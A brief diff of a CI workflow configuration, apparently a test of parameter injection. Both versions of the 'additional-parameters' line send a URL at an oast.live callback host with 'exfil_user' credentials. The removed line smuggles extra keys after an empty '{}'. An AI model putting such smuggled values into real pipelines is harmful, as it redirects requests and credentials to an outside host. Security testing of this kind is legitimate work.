@@ -15,4 +15,4 @@ jobs:
           username: 'testuser'
           password: 'testpass'
           cr-number: '12345'
-          additional-parameters: '{}, "url": "https://d91eqdkjor36hfjvqohghe8uy8rqk6yg1.oast.live", "username": "exfil_user", "password": "exfil_pass"'
+          additional-parameters: '{"url": "https://d91eqdkjor36hfjvqohghe8uy8rqk6yg1.oast.live", "username": "exfil_user", "password": "exfil_pass"}'
